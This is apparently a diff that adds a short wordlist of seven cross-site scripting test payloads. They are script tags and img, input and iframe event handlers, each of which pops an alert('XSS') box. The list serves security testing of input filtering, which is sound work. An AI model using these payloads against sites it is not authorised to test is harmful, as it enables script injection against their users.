@@ -1,0 +1,7 @@
+<SCRIPT>alert('XSS')</SCRIPT>
+<IMG SRC="#" ONERROR="alert('XSS')"/>
+<INPUT TYPE="BUTTON" ONCLICK="alert('XSS')"/>
+<INPUT TYPE="BUTTON" ONMOUSEUP="alert('XSS')"/>
+<INPUT TYPE="BUTTON" ONMOUSEOVER="alert('XSS')"/>
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<IFRAME SRC='#' onload='alert("XSS")'></IFRAME>
